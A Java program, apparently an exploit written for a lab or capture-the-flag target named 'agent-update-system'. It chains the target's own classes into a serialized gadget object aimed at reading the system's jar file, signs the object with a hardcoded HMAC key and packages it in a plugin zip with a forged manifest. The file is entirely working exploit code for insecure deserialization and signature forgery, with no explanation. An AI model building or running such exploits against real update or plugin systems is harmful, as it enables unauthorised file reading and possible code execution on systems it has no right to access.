import com.agent.update.deserialization.*;
import java.io.*;
import java.nio.file.*;
import java.util.zip.*;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;

public class ReadJar {
    public static void main(String[] args) throws Exception {
        String path = args.length > 0 ? args[0] : "/app/agent-update-system.jar";
        String safe = "read_jar";
        
        FileExporter e = new FileExporter(); e.setTeamId("admin");
        DataStream ds = new DataStream(); ds.setExporter(e);
        ResourceRefresher rr = new ResourceRefresher(); rr.setTargetPath(path); rr.setDataStream(ds);
        
        Path ser = Paths.get("readjar.ser");
        try (FileOutputStream fo = new FileOutputStream(ser.toFile()); ObjectOutputStream oo = new ObjectOutputStream(fo)) { oo.writeObject(rr); }
        
        byte[] sd = Files.readAllBytes(ser);
        Mac mac = Mac.getInstance("HmacSHA256"); mac.init(new SecretKeySpec("k3y_5A62_X86".getBytes(), "HmacSHA256"));
        String sig = Base64.getEncoder().encodeToString(mac.doFinal(sd));
        String mf = "{\"pluginName\":\"readjar\",\"version\":\"1.0\",\"hmacSignature\":\"" + sig + "\"}";
        
        try (ZipOutputStream zo = new ZipOutputStream(new FileOutputStream("readjar.zip"))) {
            zo.putNextEntry(new ZipEntry("manifest.json")); zo.write(mf.getBytes()); zo.closeEntry();
            zo.putNextEntry(new ZipEntry("metadata.ser")); zo.write(sd); zo.closeEntry();
        }
        System.out.println("OK: readjar.zip for " + path);
    }
}
